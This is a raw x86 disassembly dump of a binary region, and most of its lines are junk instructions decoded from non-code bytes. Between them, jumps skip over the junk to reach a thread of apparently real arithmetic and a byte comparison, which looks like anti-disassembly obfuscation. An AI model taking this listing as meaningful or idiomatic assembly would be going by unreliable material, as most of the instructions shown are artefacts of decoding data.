  41b6af:	mov    DWORD PTR [esi-0x16],ecx
  41b6b2:	jecxz  0x41b6c0
  41b6b4:	in     al,0x4c
  41b6b6:	add    al,0x3e
  41b6b8:	jg     0x41b728
  41b6ba:	cwde   
  41b6bb:	mov    ah,0xbf
  41b6bd:	repnz sbb BYTE PTR [edi],dh
  41b6c0:	push   cs
  41b6c1:	call   0x5ed6:0x13a4838a
  41b6c8:	mov    DWORD PTR [eax],ecx
  41b6ca:	mov    DWORD PTR [eax+0x4],edx
  41b6cd:	pop    ebx
  41b6ce:	leave  
  41b6cf:	ret    0x8
  41b6d2:	push   ebp
  41b6d3:	mov    ebp,esp
  41b6d5:	sub    esp,0x30
  41b6d8:	push   esi
  41b6d9:	jmp    0x41b7a7
  41b6de:	call   0xffdc2242
  41b6e3:	mov    esi,0x68647ff9
  41b6e8:	loope  0x41b6a9
  41b6ea:	(bad)  
  41b6eb:	(bad)  
  41b6ec:	mov    esi,0x13d594e
  41b6f1:	add    BYTE PTR [ecx+0x2c000000],dh
  41b6f7:	push   0x733f208a
  41b6fc:	arpl   WORD PTR [di-0x59],ax
  41b700:	retf   0xe7e5
  41b703:	add    al,0xb4
  41b705:	call   0xc123997b
  41b70a:	sub    BYTE PTR [edi],al
  41b70c:	fistp  WORD PTR [edi-0x3e]
  41b70f:	xor    DWORD PTR [ebx-0x501e2f58],esi
  41b715:	dec    edx
  41b716:	xor    eax,0xfd5fdb59
  41b71b:	es pusha 
  41b71d:	cmp    eax,ebp
  41b71f:	bound  edx,QWORD PTR [eax-0x59]
  41b722:	ins    DWORD PTR es:[edi],dx
  41b723:	cmp    DWORD PTR [edx-0xc],esp
  41b726:	test   eax,0xdc148086
  41b72b:	push   edi
  41b72c:	jne    0x41b74f
  41b72e:	out    dx,eax
  41b72f:	jnp    0x41b749
  41b731:	sbb    bh,BYTE PTR [ecx]
  41b733:	ja     0x41b7a7
  41b735:	lods   al,BYTE PTR ds:[esi]
  41b736:	push   edi
  41b737:	cmp    al,0xd
  41b739:	inc    eax
  41b73a:	test   BYTE PTR [ecx],ah
  41b73c:	sub    DWORD PTR [esi+0x1c],ebx
  41b73f:	sbb    DWORD PTR [ecx+0xb5c7a47],ebx
  41b745:	out    dx,al
  41b746:	mov    al,ds:0xd64e2462
  41b74b:	jno    0x41b7ac
  41b74d:	cmp    cl,BYTE PTR [edi]
  41b74f:	fwait
  41b750:	ret    0x468c
  41b753:	and    DWORD PTR [edx],0xea734e25
  41b759:	push   0x5d
  41b75b:	mov    esp,0xea16646d
  41b760:	leave  
  41b761:	push   cs
  41b762:	push   ebx
  41b763:	cmp    ch,BYTE PTR [edi-0x15567e28]
  41b769:	sbb    eax,0x7c3908a4
  41b76e:	pop    ebx
  41b76f:	fwait
  41b770:	pusha  
  41b771:	jp     0x41b7ab
  41b773:	pop    edi
  41b774:	push   esi
  41b775:	mov    DWORD PTR [esi],edi
  41b777:	cmp    bl,BYTE PTR [ebx-0x42]
  41b77a:	xor    eax,0xd702ff42
  41b77f:	jmp    0x41b79e
  41b781:	jb     0x41b78a
  41b783:	imul   esp,DWORD PTR [ebx-0x62],0x80deaf72
  41b78a:	lock call 0xec7a:0x40d3cf1a
  41b792:	add    edx,DWORD PTR [eax]
  41b794:	sar    DWORD PTR [edx],0x20
  41b797:	hlt    
  41b798:	nop
  41b799:	leave  
  41b79a:	mov    esi,cs
  41b79c:	pop    ebp
  41b79d:	or     DWORD PTR [edi+0x72],0xbe32d2ec
  41b7a4:	into   
  41b7a5:	pop    esp
  41b7a6:	sub    al,bh
  41b7a8:	inc    ebp
  41b7a9:	call   0x41c195
  41b7ae:	mov    DWORD PTR [ebp-0x14],0x886
  41b7b5:	jmp    0x41b883
  41b7ba:	inc    edi
  41b7bb:	pop    ebp
  41b7bc:	(bad)  
  41b7bd:	cmp    al,0xfe
  41b7bf:	mov    edi,0xe2567fc7
  41b7c4:	retf   0xc2bb
  41b7c7:	retf   0xa1d2
  41b7ca:	or     bh,BYTE PTR [esi]
  41b7cc:	add    DWORD PTR [eax],eax
  41b7ce:	mov    cl,0x0
  41b7d0:	add    BYTE PTR [eax],al
  41b7d2:	mov    ebp,0x6243dff0
  41b7d7:	iret   
  41b7d8:	ret    
  41b7d9:	sbb    BYTE PTR ss:[esi],bh
  41b7dc:	repnz repnz cli 
  41b7df:	loopne 0x41b78b
  41b7e1:	dec    eax
  41b7e2:	mov    esp,edi
  41b7e4:	sti    
  41b7e5:	fbstp  TBYTE PTR [esi+0x5ead36bb]
  41b7eb:	scas   eax,DWORD PTR es:[edi]
  41b7ec:	enter  0xaec6,0xe7
  41b7f0:	(bad)  
  41b7f1:	adc    esp,DWORD PTR [eax-0x1043db6f]
  41b7f7:	int    0x74
  41b7f9:	mov    DWORD PTR [esi+0x6a6bc6dc],ebx
  41b7ff:	call   0x3b77c37d
  41b804:	xchg   BYTE PTR [edx],ch
  41b806:	jmp    0x5177:0xc31fb1dc
  41b80d:	or     eax,0x590afeb
  41b812:	pop    esp
  41b813:	xor    al,0xe8
  41b815:	and    eax,0x1d35306b
  41b81a:	dec    esp
  41b81b:	sub    DWORD PTR [eax],ebx
  41b81d:	loopne 0x41b834
  41b81f:	in     eax,0xda
  41b821:	mov    bh,0x2
  41b823:	fs out dx,eax
  41b825:	fsub   st,st(7)
  41b827:	or     al,0x12
  41b829:	adc    dl,al
  41b82b:	pop    ebx
  41b82c:	mov    ecx,DWORD PTR [ebx]
  41b82e:	clc    
  41b82f:	dec    eax
  41b830:	push   ebp
  41b831:	sub    ch,BYTE PTR [esi]
  41b833:	or     DWORD PTR [eax-0x27],ebx
  41b836:	or     DWORD PTR [ebx],eax
  41b838:	adc    eax,0xe792a641
  41b83d:	sub    eax,0xd5c1254
  41b842:	pusha  
  41b843:	sub    eax,0x51efdbd3
  41b848:	jb     0x1ea59628
  41b84e:	sub    edx,DWORD PTR [eax-0x12]
  41b851:	pusha  
  41b852:	jmp    0x82d7b5b2
  41b857:	mov    al,0xc3
  41b859:	mov    eax,0xc3b88499
  41b85e:	fimul  WORD PTR [edx+0x3b]
  41b861:	mov    BYTE PTR [edx-0x3],dl
  41b864:	mov    ds:0x485ad103,eax
  41b869:	and    ecx,DWORD PTR [edi+0x12]
  41b86c:	adc    ebp,DWORD PTR [edi]
  41b86e:	cmp    BYTE PTR [eax],cl
  41b870:	mov    al,ds:0x488a8e4c
  41b875:	ins    DWORD PTR es:[edi],dx
  41b876:	sbb    edi,DWORD PTR [eax+esi*1-0x7]
  41b87a:	sub    ebx,ebx
  41b87c:	lods   al,BYTE PTR ds:[esi]
  41b87d:	(bad)  
  41b87e:	(bad)  
  41b87f:	cmp    eax,0xc7504aa4
  41b884:	inc    ebp
  41b885:	lock scas eax,DWORD PTR es:[edi]
  41b887:	and    al,0x0
  41b889:	add    cl,ch
  41b88b:	leave  
  41b88c:	add    BYTE PTR [eax],al
  41b88e:	add    BYTE PTR [edx+0x52],dl
  41b891:	gs gs gs ja 0x41b8e8
  41b896:	ja     0x41b833
  41b898:	jo     0x41b8a5
  41b89a:	gs out dx,al
  41b89c:	pop    ebp
  41b89d:	js     0x41b862
  41b89f:	mov    ebx,0xb100013e
  41b8a4:	add    BYTE PTR [eax],al
  41b8a6:	add    BYTE PTR [eax+0x69],bh
  41b8a9:	xchg   DWORD PTR [ebx-0x3e4cb401],esi
  41b8af:	pushf  
  41b8b0:	xchg   ecx,eax
  41b8b1:	outs   dx,BYTE PTR ds:[esi]
  41b8b2:	jge    0x41b8bd
  41b8b4:	mov    esp,0x6d5f0689
  41b8b9:	mov    ds:0x27dff3d,al
  41b8be:	mov    al,0xc8
  41b8c0:	mov    esi,DWORD PTR [ebx+ecx*4]
  41b8c3:	and    edi,edi
  41b8c5:	push   es
  41b8c6:	jo     0x41b8e7
  41b8c8:	ret    
  41b8c9:	into   
  41b8ca:	ret    0xc212
  41b8cd:	icebp  
  41b8ce:	je     0x41b8bd
  41b8d0:	inc    ebx
  41b8d1:	mov    esi,0x34133020
  41b8d6:	sahf   
  41b8d7:	xor    cl,ah
  41b8d9:	jmp    0x8105:0xd210649f
  41b8e0:	cmp    DWORD PTR cs:[edx],edx
  41b8e3:	xchg   edx,eax
  41b8e4:	dec    esp
  41b8e5:	dec    eax
  41b8e6:	xor    DWORD PTR [esi-0x60],0xffffffc4
  41b8ea:	mov    ch,0xf1
  41b8ec:	aas    
  41b8ed:	mul    bh
  41b8ef:	or     eax,DWORD PTR [esi-0x6c]
  41b8f2:	mov    eax,esi
  41b8f4:	jp     0x41b8c6
  41b8f6:	enter  0x29eb,0x88
  41b8fa:	dec    edx
  41b8fb:	cs push 0x4bb0dea6
  41b901:	loopne 0x41b8fd
  41b903:	add    eax,0xaf689ce2
  41b908:	adc    DWORD PTR [edx+0x307ab63d],ebx
  41b90e:	imul   edx,DWORD PTR [ebx+0x52],0x43
  41b912:	or     eax,DWORD PTR [eax+0x2ee4c9e5]
  41b918:	sbb    eax,DWORD PTR [edi-0x7c]
  41b91b:	xchg   esp,eax
  41b91c:	test   eax,0xbd798e00
  41b921:	pop    esp
  41b922:	fisub  WORD PTR [ebx+eiz*2-0x19]
  41b926:	imul   esi,DWORD PTR [ebp+0x77],0x8fc6e585
  41b92d:	cld    
  41b92e:	mov    al,ds:0xd1446f71
  41b933:	add    ebp,ebx
  41b935:	xchg   edx,eax
  41b936:	ss test dl,ch
  41b939:	aad    0x82
  41b93b:	data16 cld 
  41b93d:	adc    dl,BYTE PTR [edi]
  41b93f:	shl    BYTE PTR [esi],1
  41b941:	pop    esp
  41b942:	push   0xb6ce4569
  41b947:	mov    cl,0x7
  41b949:	out    dx,eax
  41b94a:	nop
  41b94b:	push   ebp
  41b94c:	retf   0xf9a0
  41b94f:	or     bh,ah
  41b951:	out    dx,al
  41b952:	mov    esi,0x2d2dacff
  41b957:	arpl   di,ax
  41b959:	inc    ebp
  41b95a:	loopne 0x41b9c6
  41b95c:	iret   
  41b95d:	or     DWORD PTR [eax],eax
  41b95f:	jmp    0x41ba2d
  41b964:	aas    
  41b965:	mov    ebp,esi
  41b967:	stos   DWORD PTR es:[edi],eax
  41b968:	(bad)  
  41b969:	out    dx,eax
  41b96a:	jg     0x41b90b
  41b96c:	inc    esp
  41b96d:	into   
  41b96e:	push   0xa92fe0a4
  41b973:	ret    
  41b974:	ins    BYTE PTR es:[edi],dx
  41b975:	aas    
  41b976:	add    DWORD PTR [eax],eax
  41b978:	mov    cl,0x0
  41b97a:	add    BYTE PTR [eax],al
  41b97c:	xchg   DWORD PTR [ebx],ebp
  41b97e:	mov    ch,0xe6
  41b980:	pop    esp
  41b981:	nop
  41b982:	xor    cl,BYTE PTR [ecx+0x7f]
  41b985:	mov    ss,WORD PTR [ecx+edx*2+0x75]
  41b989:	pop    esi
  41b98a:	xor    eax,0xb2a87556
  41b98f:	jns    0x41b9de
  41b991:	xor    al,0xcf
  41b993:	xchg   esi,eax
  41b994:	pushf  
  41b995:	inc    BYTE PTR [ecx]
  41b997:	cli    
  41b998:	test   eax,0x2eeb2418
  41b99d:	ret    0xdd93
  41b9a0:	(bad)
  41b9a5:	vprotd ymm6,xmm6,0x72
  41b9aa:	sar    al,1
  41b9ac:	sub    bl,BYTE PTR ds:0x7d328b5
  41b9b2:	cdq    
  41b9b3:	add    ch,dl
  41b9b5:	adc    al,0x2a
  41b9b7:	or     DWORD PTR ds:0xcb8b8583,edi
  41b9bd:	push   ss
  41b9be:	xchg   esp,eax
  41b9bf:	scas   al,BYTE PTR es:[edi]
  41b9c0:	mov    dl,0x5
  41b9c2:	sbb    ch,BYTE PTR [ebx]
  41b9c4:	sti    
  41b9c5:	push   0x9b69aa5d
  41b9ca:	fbld   TBYTE PTR [esi+0x4aee3a03]
  41b9d0:	int3   
  41b9d1:	add    al,0x5a
  41b9d3:	hlt    
  41b9d4:	pop    ebp
  41b9d5:	sar    ebp,1
  41b9d7:	inc    esi
  41b9d8:	scas   eax,DWORD PTR es:[edi]
  41b9d9:	inc    ebp
  41b9da:	sub    al,0x82
  41b9dc:	adc    edx,DWORD PTR [edx-0x23]
  41b9df:	mov    eax,ds:0x7ef42878
  41b9e4:	cmp    eax,0x763f6fa
  41b9e9:	lods   al,BYTE PTR ds:[esi]
  41b9ea:	inc    edi
  41b9eb:	ret    0x960c
  41b9ee:	std    
  41b9ef:	(bad)  
  41b9f0:	lahf   
  41b9f1:	rol    dl,cl
  41b9f3:	fdivp  st(1),st
  41b9f5:	adc    DWORD PTR [eax-0x2bf5984c],esp
  41b9fb:	push   0x123c4282
  41ba00:	and    BYTE PTR [esi],dl
  41ba02:	mov    ch,0xe3
  41ba04:	ret    
  41ba05:	repz frstor [ebx+edx*1+0x132bfec5]
  41ba0d:	pop    esi
  41ba0e:	outs   dx,DWORD PTR ds:[esi]
  41ba0f:	int3   
  41ba10:	lahf   
  41ba11:	sbb    ebx,ecx
  41ba13:	repz ror DWORD PTR [ebp-0x69987501],cl
  41ba1a:	adc    ebp,esi
  41ba1c:	jnp    0x41ba53
  41ba1e:	fadd   DWORD PTR [ebx+eax*2-0x12e7a122]
  41ba25:	nop
  41ba26:	lods   eax,DWORD PTR ds:[esi]
  41ba27:	pop    esi
  41ba28:	das    
  41ba29:	and    DWORD PTR [esi+0x45c7b00a],0x4ebee4
  41ba33:	add    bh,al
  41ba35:	inc    ebp
  41ba36:	hlt    
  41ba37:	cli    
  41ba38:	xor    al,0x0
  41ba3a:	add    bh,al
  41ba3c:	inc    ebp
  41ba3d:	clc    
  41ba3e:	xor    BYTE PTR [eax],bh
  41ba40:	add    BYTE PTR [eax],al
  41ba42:	mov    DWORD PTR [ebp-0x4],0x295f
  41ba49:	jmp    0x41bb17
  41ba4e:	inc    edi
  41ba4f:	call   0x7e00e005
  41ba54:	xlat   BYTE PTR ds:[ebx]
  41ba55:	jmp    0xdb82:0xc3661a77
  41ba5c:	push   edx
  41ba5d:	xor    ebx,DWORD PTR ds:0xb1000140
  41ba63:	add    BYTE PTR [eax],al
  41ba65:	add    BYTE PTR [edx+0x39e3f72d],dl
  41ba6b:	mov    ds:0x4259f794,eax
  41ba70:	loop   0x41bada
  41ba72:	gs push cs
  41ba74:	add    DWORD PTR [ebx+0x3a],ecx
  41ba77:	rcl    BYTE PTR [esp+ecx*8],1
  41ba7a:	adc    eax,0x75f1d537
  41ba7f:	aam    0x16
  41ba81:	xchg   ebp,eax
  41ba82:	cmp    eax,0x89124d1a
  41ba87:	pusha  
  41ba88:	jno    0x41ba97
  41ba8a:	pop    edx
  41ba8b:	mov    ecx,0x247e8f78
  41ba90:	repz inc edx
  41ba92:	fwait
  41ba93:	ja     0x41baac
  41ba95:	mov    WORD PTR [ecx+edx*4+0x6b],ds
  41ba99:	enter  0xdf7a,0xa0
  41ba9d:	shl    DWORD PTR [esi+0x40],0x9f
  41baa1:	push   ds
  41baa2:	lods   eax,DWORD PTR ds:[esi]
  41baa3:	dec    edx
  41baa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baa5:	shr    BYTE PTR [ebp+eiz*8-0x4638b520],0xbf
  41baad:	loop   0x41ba95
  41baaf:	cli    
  41bab0:	xor    BYTE PTR [esi+0x12af8fae],cl
  41bab6:	jmp    0x41bb2e
  41bab8:	lods   eax,DWORD PTR ds:[esi]
  41bab9:	xchg   ebx,eax
  41baba:	sub    al,ah
  41babc:	xor    BYTE PTR [eax+0x72],bl
  41babf:	push   ebp
  41bac0:	mov    ecx,0x7d2846fe
  41bac5:	cmp    bl,cl
  41bac7:	fbstp  TBYTE PTR [eax-0x26]
  41baca:	cld    
  41bacb:	cli    
  41bacc:	and    eax,0x68f71b6f
  41bad1:	cmp    al,0xba
  41bad3:	popf   
  41bad4:	int    0x9b
  41bad6:	sbb    ch,BYTE PTR [ebx+0x65]
  41bad9:	jbe    0x41ba62
  41badb:	dec    ebx
  41badc:	push   DWORD PTR fs:[ecx]
  41badf:	ss int 0xab
  41bae2:	dec    ebx
  41bae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bae4:	adc    DWORD PTR [ebp-0x3e],ebx
  41bae7:	sbb    DWORD PTR [edx+0x15],ebx
  41baea:	jecxz  0x41bb38
  41baec:	dec    ecx
  41baed:	stos   DWORD PTR es:[edi],eax
  41baee:	outs   dx,DWORD PTR ds:[esi]
  41baef:	mov    BYTE PTR [eax],al
  41baf1:	cdq    
  41baf2:	ror    BYTE PTR [edx-0x2b],0x6e
  41baf6:	lds    esi,FWORD PTR ds:0xe6459ca
  41bafc:	cmp    BYTE PTR [esi+0x120fde1b],0x44
  41bb03:	and    BYTE PTR [edx],al
  41bb05:	(bad)  
  41bb06:	xor    al,0x87
  41bb08:	pop    edx
  41bb09:	push   cs
  41bb0a:	repz notrack jmp DWORD PTR [ecx]
  41bb0e:	inc    esi
  41bb0f:	jl     0x41bb44
  41bb11:	and    eax,0xb66ecf60
  41bb16:	cmp    eax,0x59dc45c7
  41bb1b:	push   es
  41bb1c:	add    BYTE PTR [eax],al
  41bb1e:	mov    DWORD PTR [ebp-0x30],0x16c1
  41bb25:	jmp    0x41bbf3
  41bb2a:	fs cmp eax,0xd7ff97ef
  41bb30:	jl     0x41bb31
  41bb32:	push   ds
  41bb33:	push   0xffffffb8
  41bb35:	mov    eax,ds:0xde59390b
  41bb3a:	into   
  41bb3b:	inc    eax
  41bb3c:	add    DWORD PTR [eax],eax
  41bb3e:	mov    cl,0x0
  41bb40:	add    BYTE PTR [eax],al
  41bb42:	mov    al,ds:0x30de7921
  41bb47:	cli    
  41bb48:	push   esp
  41bb49:	adc    DWORD PTR [edx+0x4288baa],ecx
  41bb4f:	cwde   
  41bb50:	xor    al,0x42
  41bb52:	fxam   
  41bb54:	scas   al,BYTE PTR es:[edi]
  41bb55:	jbe    0x41bb7a
  41bb57:	ret    
  41bb58:	jae    0x41badb
  41bb5a:	adc    dh,BYTE PTR [edi]
  41bb5c:	out    0xca,al
  41bb5e:	bound  eax,QWORD PTR [edx+0x55]
  41bb61:	sub    bl,al
  41bb63:	jo     0x41bb0b
  41bb65:	imul   BYTE PTR [ebp-0xe26033b]
  41bb6b:	adc    al,BYTE PTR [edx]
  41bb6d:	xor    BYTE PTR [ecx],cl
  41bb6f:	pusha  
  41bb70:	sahf   
  41bb71:	add    ch,BYTE PTR [edx]
  41bb73:	ja     0x41bbb6
  41bb75:	mov    DWORD PTR ds:0x8aeaeb34,esi
  41bb7b:	inc    edx
  41bb7c:	rcl    DWORD PTR [esi],1
  41bb7e:	out    0xf5,al
  41bb80:	ret    
  41bb81:	adc    BYTE PTR [edi],bl
  41bb83:	mov    DWORD PTR [esi+0x3b49561b],ebx
  41bb89:	aad    0x4d
  41bb8b:	sbb    ebx,DWORD PTR [ebx]
  41bb8d:	test   DWORD PTR [ebx],ebp
  41bb8f:	into   
  41bb90:	cmc    
  41bb91:	fs mov ebp,0x70ac63ab
  41bb97:	popa   
  41bb98:	aad    0xb
  41bb9a:	jecxz  0x41bb7f
  41bb9c:	pop    eax
  41bb9d:	gs mov esi,0x1b7eed09
  41bba3:	daa    
  41bba4:	sbb    dh,BYTE PTR [ebx+0x55b190fd]
  41bbaa:	mov    ds:0x499ad155,eax
  41bbaf:	inc    edx
  41bbb0:	imul   ebx,DWORD PTR [edx+ecx*2-0x7ec39fde],0x8cbb8bc9
  41bbbb:	fild   QWORD PTR [eax]
  41bbbd:	jp     0x41bba0
  41bbbf:	into   
  41bbc0:	out    dx,eax
  41bbc1:	jmp    0x41bb81
  41bbc3:	(bad)  
  41bbc4:	jae    0x41bb84
  41bbc6:	fldcw  WORD PTR [esp+eiz*8-0x5d]
  41bbca:	ja     0x41bc2f
  41bbcc:	out    dx,eax
  41bbcd:	mov    es,ecx
  41bbcf:	(bad)  
  41bbd0:	test   ebp,0x3ed2fa96
  41bbd6:	fs jmp 0xcf02e444
  41bbdc:	jne    0x41bbad
  41bbde:	inc    eax
  41bbdf:	or     eax,0xc14d00f8
  41bbe4:	les    ebp,FWORD PTR [eax+0x77]
  41bbe7:	mov    ebp,0x17a9edf3
  41bbec:	cmp    cl,BYTE PTR [edx+0x2f2907]
  41bbf2:	icebp  
  41bbf3:	mov    DWORD PTR [ebp-0x2c],0x7f7a
  41bbfa:	mov    DWORD PTR [ebp-0x28],0x3a1c
  41bc01:	mov    eax,DWORD PTR [ebp-0x10]
  41bc04:	mov    ecx,DWORD PTR [ebp-0x14]
  41bc07:	imul   eax,eax,0x1cd3
  41bc0d:	sub    eax,ecx
  41bc0f:	mov    ecx,DWORD PTR [ebp-0x18]
  41bc12:	jmp    0x41bce0
  41bc17:	xor    DWORD PTR [ecx-0x300ef09f],esp
  41bc1d:	jg     0x41bbde
  41bc1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc20:	and    DWORD PTR [ecx-0x290f5986],edi
  41bc26:	int    0x7f
  41bc28:	inc    ecx
  41bc29:	add    DWORD PTR [eax],eax
  41bc2b:	mov    cl,0x0
  41bc2d:	add    BYTE PTR [eax],al
  41bc2f:	adc    DWORD PTR [ecx+esi*4],0x80abb5e8
  41bc36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc37:	ja     0x41bc49
  41bc39:	shr    dl,1
  41bc3b:	mov    ah,0x6b
  41bc3d:	(bad)  
  41bc3e:	xlat   BYTE PTR ds:[ebx]
  41bc3f:	mov    ds,WORD PTR [esi+0x461d5fcf]
  41bc45:	out    0x3c,eax
  41bc47:	aas    
  41bc48:	call   0x8b6f:0x86460b9b
  41bc4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc50:	fisubr DWORD PTR [ecx]
  41bc52:	retf   
  41bc53:	retf   0x88f4
  41bc56:	in     eax,dx
  41bc57:	pop    ds
  41bc58:	aam    0x78
  41bc5a:	push   cs
  41bc5b:	ficomp DWORD PTR [esi+0x65ec91a9]
  41bc61:	inc    esi
  41bc62:	dec    edi
  41bc63:	data16 in al,0xaa
  41bc66:	js     0x41bbef
  41bc68:	or     ebp,DWORD PTR [edx+0x491f2fbf]
  41bc6e:	ror    edx,1
  41bc70:	ret    
  41bc71:	repnz retf 
  41bc73:	out    dx,al
  41bc74:	dec    ebp
  41bc75:	fdivr  DWORD PTR [eax-0x4f6fddfc]
  41bc7b:	mov    edi,0x1a62b349
  41bc80:	or     eax,0x7ef9441b
  41bc85:	xor    DWORD PTR [ebx+0x8],edi
  41bc88:	jmp    0x7270:0x5f533479
  41bc8f:	test   BYTE PTR [esi],al
  41bc91:	mov    dh,0xcc
  41bc93:	sub    BYTE PTR [ebp+0x4ba09702],0xe1
  41bc9a:	loopne 0x41bc81
  41bc9c:	dec    ebp
  41bc9d:	jge    0x41bc82
  41bc9f:	adc    eax,DWORD PTR [edi+eiz*8+0x68497ec2]
  41bca6:	je     0x41bd13
  41bca8:	mov    ah,BYTE PTR [eax]
  41bcaa:	adc    ah,BYTE PTR [ecx-0x3e302b0a]
  41bcb0:	push   esp
  41bcb1:	jns    0x41bc85
  41bcb3:	lock aaa 
  41bcb5:	bound  edi,QWORD PTR [esi]
  41bcb7:	lods   al,BYTE PTR ds:[esi]
  41bcb8:	lea    edx,[ebp+0x47]
  41bcbb:	sbb    ebp,esi
  41bcbd:	cmp    al,bh
  41bcbf:	icebp  
  41bcc0:	push   esi
  41bcc1:	add    al,0x1f
  41bcc3:	mov    edi,0xfce9cf14
  41bcc8:	add    al,0xb0
  41bcca:	xor    al,0xe7
  41bccc:	(bad)  
  41bccd:	mov    edi,0xbfa18a35
  41bcd2:	jg     0x41bcbb
  41bcd4:	fistp  WORD PTR [eax]
  41bcd6:	icebp  
  41bcd7:	cwde   
  41bcd8:	lahf   
  41bcd9:	shl    BYTE PTR [edx+0x38],cl
  41bcdc:	jge    0x41bd19
  41bcde:	sbb    al,0xd0
  41bce0:	or     eax,0xcea
  41bce5:	lea    ecx,[eax+ecx*1-0x42169e6]
  41bcec:	mov    eax,DWORD PTR [ebp-0x1c]
  41bcef:	mov    esi,DWORD PTR [ebp-0x20]
  41bcf2:	jmp    0x41bdc0
  41bcf7:	mov    ds:0x7b4f4bd0,eax
  41bcfc:	fbld   TBYTE PTR [edi+0x389236fc]
  41bd02:	imul   ebp,DWORD PTR [ebx+0x30a143ca],0xb1000142
  41bd0c:	add    BYTE PTR [eax],al
  41bd0e:	add    ch,bl
  41bd10:	mov    dl,0x4
  41bd12:	mov    edx,ebx
  41bd14:	mov    edx,0xf414dfc7
  41bd19:	or     edi,esp
  41bd1b:	aas    
  41bd1c:	xor    ebp,ecx
  41bd1e:	push   esi
  41bd1f:	lods   eax,DWORD PTR ds:[esi]
  41bd20:	adc    al,0x9d
  41bd22:	mov    al,ss:0x4aa8b2ab
  41bd28:	sahf   
  41bd29:	cmp    al,0x35
  41bd2b:	icebp  
  41bd2c:	xlat   BYTE PTR ds:[ebx]
  41bd2d:	in     eax,dx
  41bd2e:	ins    DWORD PTR es:[edi],dx
  41bd2f:	mov    esi,0x1d17a7e3
  41bd34:	cmc    
  41bd35:	mov    ch,0x6d
  41bd37:	js     0x41bcfd
  41bd39:	add    DWORD PTR [edx],ebx
  41bd3b:	std    
  41bd3c:	lahf   
  41bd3d:	in     al,dx
  41bd3e:	repz fisttp WORD PTR [ebx]
  41bd41:	fs lock sub eax,0xf480acff
  41bd48:	lods   al,BYTE PTR ds:[esi]
  41bd49:	imul   eax,DWORD PTR [esi-0x36],0xa361222a
  41bd50:	scas   al,BYTE PTR es:[edi]
  41bd51:	mov    gs,WORD PTR [edi+0x11]
  41bd54:	ins    BYTE PTR es:[edi],dx
  41bd55:	or     al,0x1a
  41bd57:	data16 sar BYTE PTR [edi],cl
  41bd5a:	in     eax,0xa8
  41bd5c:	add    ecx,edx
  41bd5e:	sbb    al,0xbd
  41bd60:	(bad)  
  41bd61:	xchg   esp,eax
  41bd62:	out    0x44,al
  41bd64:	retf   
  41bd65:	into   
  41bd66:	mov    BYTE PTR [esi],bh
  41bd68:	mov    eax,ds:0xcc295b11
  41bd6d:	sub    BYTE PTR [esi-0x3e],ch
  41bd70:	loopne 0x41bd04
  41bd72:	test   edi,0xc32e8b95
  41bd78:	cmp    BYTE PTR [ecx+edi*1+0x31],bh
  41bd7c:	retf   
  41bd7d:	push   edi
  41bd7e:	aaa    
  41bd7f:	frstor [ebx]
  41bd81:	mov    edi,DWORD PTR [edx-0x632d21b0]
  41bd87:	jnp    0x41bd8e
  41bd89:	mov    al,0x49
  41bd8b:	stos   DWORD PTR es:[edi],eax
  41bd8c:	mov    WORD PTR [ebp-0x2d],?
  41bd8f:	int3   
  41bd90:	jge    0x41bd66
  41bd92:	xchg   esp,eax
  41bd93:	aad    0xcd
  41bd95:	fstp   TBYTE PTR [ebx-0x4]
  41bd98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd99:	jne    0x41bde7
  41bd9b:	inc    edi
  41bd9c:	push   esi
  41bd9d:	cmp    DWORD PTR [ebx-0x14],0xb614b5dc
  41bda4:	loop   0x41bd32
  41bda6:	mov    eax,0xf70bed62
  41bdab:	jl     0x41bde4
  41bdad:	je     0x41bded
  41bdaf:	jnp    0x41bd8d
  41bdb1:	mov    al,0x2a
  41bdb3:	mov    esi,0x6f3ceb70
  41bdb8:	into   
  41bdb9:	pop    es
  41bdba:	js     0x41bd79
  41bdbc:	in     eax,0x38
  41bdbe:	jmp    0x41bde1
  41bdc0:	imul   eax,eax,0x50fb
  41bdc6:	xor    eax,0x378d
  41bdcb:	xor    edx,edx
  41bdcd:	div    esi
  41bdcf:	mov    edx,DWORD PTR [ebp+0x8]
  41bdd2:	sub    al,0x3d
  41bdd4:	cmp    BYTE PTR [ecx+edx*1],al
  41bdd7:	jmp    0x41bea5
  41bddc:	inc    esp
  41bddd:	shl    DWORD PTR [edi+0x4c],0xe7
  41bde1:	out    dx,al
  41bde2:	outs   dx,DWORD PTR ds:[esi]
  41bde3:	leave  
  41bde4:	js     0x41bdce
  41bde6:	std    
  41bde7:	jo     0x41be32
  41bde9:	(bad)  
  41bdeb:	cmp    cl,ah
  41bded:	inc    edx
  41bdee:	add    DWORD PTR [eax],eax
  41bdf0:	mov    cl,0x0
  41bdf2:	add    BYTE PTR [eax],al
  41bdf4:	sbb    al,BYTE PTR [edi-0x59]
  41bdf7:	daa    
  41bdf8:	cmp    dh,BYTE PTR [esi+0x7f]
  41bdfb:	in     eax,dx
  41bdfc:	sbb    DWORD PTR [ebp+0x70bf918d],eax
  41be02:	and    BYTE PTR [ebp-0xabf5cb3],al
  41be08:	stc    
  41be09:	xchg   esi,eax
  41be0a:	idiv   BYTE PTR [edi]
  41be0c:	adc    eax,0x8c7345d0
  41be11:	cld    
  41be12:	cmp    al,0x5c
  41be14:	mov    esp,0xcf43689b
  41be19:	cli    
  41be1a:	imul   ecx,esp,0x4b4f5860
  41be20:	ret    
  41be21:	out    0xc9,eax
  41be23:	retf   0xcea2
  41be26:	nop
  41be27:	jne    0x41bdd2
  41be29:	mov    ch,0x53
  41be2b:	inc    ebx
  41be2c:	pop    eax
  41be2d:	adc    al,0x27
  41be2f:	out    dx,al
  41be30:	push   eax
  41be31:	and    eax,0x83baebe3
  41be36:	inc    edx
  41be37:	xor    DWORD PTR [ebx+0x53126073],eax
  41be3d:	or     ah,BYTE PTR [ecx+ebx*1]
  41be40:	mov    esp,0xd5304644
  41be45:	add    eax,DWORD PTR [ebp-0x7342d6d0]
  41be4b:	mov    esi,0x7677f81d
  41be50:	lea    ebx,[ebx+0x796a61c1]
  41be56:	das    
  41be57:	stos   DWORD PTR es:[edi],eax
  41be58:	and    DWORD PTR [ecx-0x3c],eax
  41be5b:	cmp    bh,BYTE PTR [ebx+0x6f]
